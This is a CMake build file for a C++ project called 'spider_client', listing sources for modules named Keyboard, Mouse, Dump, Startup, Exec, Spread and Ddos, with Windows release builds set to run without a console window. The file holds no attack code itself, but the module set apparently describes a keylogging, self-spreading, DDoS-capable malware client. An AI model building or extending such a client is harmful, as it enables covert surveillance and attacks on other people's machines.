# stop if cmake version below 3.3
cmake_minimum_required(VERSION 3.3 FATAL_ERROR)

# project name
project(spider_client)


# location of additional cmake modules
set(CMAKE_MODULE_PATH
    ${CMAKE_MODULE_PATH}
    ${CMAKE_CURRENT_SOURCE_DIR}/CMake
)

# project version
set(VERSION_MAJOR 1)
set(VERSION_MINOR 0)
string(STRIP ${CMAKE_BUILD_TYPE} BUILD_TYPE)

# configure header file
configure_file(
    ${PROJECT_SOURCE_DIR}/CMake/SpiderClient_Config.h.in
    ${PROJECT_BINARY_DIR}/includes/SpiderClient_Config.h
)

# detect operating system
if(${CMAKE_SYSTEM_NAME} STREQUAL "Linux")
    add_definitions(-DSYSTEM_LINUX)
endif()
if(${CMAKE_SYSTEM_NAME} STREQUAL "Darwin")
    add_definitions(-DSYSTEM_DARWIN)
endif()
if(${CMAKE_SYSTEM_NAME} MATCHES "Windows")
    add_definitions(-DSYSTEM_WINDOWS)
endif()


# example how to set c++ compiler flags for GNU
if(CMAKE_CXX_COMPILER_ID MATCHES GNU)
    set(CMAKE_CXX_FLAGS         "${CMAKE_CXX_FLAGS} -W -Wall -Wextra -Werror")
    set(CMAKE_CXX_FLAGS         "-std=c++11 -pthread")
    set(CMAKE_CXX_FLAGS_DEBUG   "-O0 -g3 -DDEBUG")
    set(CMAKE_CXX_FLAGS_RELEASE "-O3")
elseif(CMAKE_CXX_COMPILER_ID MATCHES Clang)
    set(CMAKE_CXX_FLAGS         "${CMAKE_CXX_FLAGS} -W -Wall -Wextra -Werror")
    set(CMAKE_CXX_FLAGS         "-std=c++11")
    set(CMAKE_CXX_FLAGS_DEBUG   "-O0 -g3 -DDEBUG")
    set(CMAKE_CXX_FLAGS_RELEASE "-O3")
endif()

link_directories(
    ${PROJECT_SOURCE_DIR}/Lib/boost/lib
)

set(SRC_FILES
    ${PROJECT_SOURCE_DIR}/Sources/main.cpp
    ${PROJECT_SOURCE_DIR}/Sources/Spider.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Spider.hpp
    ${PROJECT_SOURCE_DIR}/Sources/ANetwork.cpp
    ${PROJECT_SOURCE_DIR}/Includes/ANetwork.hpp
    ${PROJECT_SOURCE_DIR}/Includes/INetwork.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Network.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Network.hpp

    ${PROJECT_SOURCE_DIR}/Sources/Socket/Client.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Socket/Client.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Socket/EventBridge.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Socket/EventBridge.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Socket/EventReceiver.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Socket/EventReceiver.hpp
    ${PROJECT_SOURCE_DIR}/Includes/Socket/Request.hpp
    ${PROJECT_SOURCE_DIR}/Includes/Message.hpp

    ${PROJECT_SOURCE_DIR}/Sources/Modules/AModule.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/AModule.hpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/IModule.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Modules/AThreadedModule.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/AThreadedModule.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Modules/Mouse.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/Mouse.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Modules/Keyboard.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/Keyboard.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Modules/Dump.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/Dump.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Modules/Startup.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/Startup.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Modules/Exec.cpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/Exec.hpp
    ${PROJECT_SOURCE_DIR}/Includes/Modules/Spread.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Modules/Spread.cpp
	${PROJECT_SOURCE_DIR}/Includes/Modules/Ddos.hpp
    ${PROJECT_SOURCE_DIR}/Sources/Modules/Ddos.cpp

)

# build executable
add_executable(spider_client ${SRC_FILES})

target_link_libraries( spider_client
    boost_system
)

if(${CMAKE_SYSTEM_NAME} MATCHES "Windows")
    set_target_properties(spider_client PROPERTIES LINK_FLAGS_DEBUG "/SUBSYSTEM:CONSOLE")
    set_target_properties(spider_client PROPERTIES RELWITHDEBINFO "/SUBSYSTEM:CONSOLE")
    set_target_properties(spider_client PROPERTIES LINK_FLAGS_RELEASE "/SUBSYSTEM:WINDOWS")
    set_target_properties(spider_client PROPERTIES MINSIZEREL "/SUBSYSTEM:WINDOWS")
endif()

# location of header files
include_directories(
    ${PROJECT_BINARY_DIR}/Includes
    ${PROJECT_SOURCE_DIR}/Includes
    ${PROJECT_SOURCE_DIR}/Lib/boost/include
    ${PROJECT_SOURCE_DIR}/Includes/Socket
    ${PROJECT_SOURCE_DIR}/Includes/Modules
)
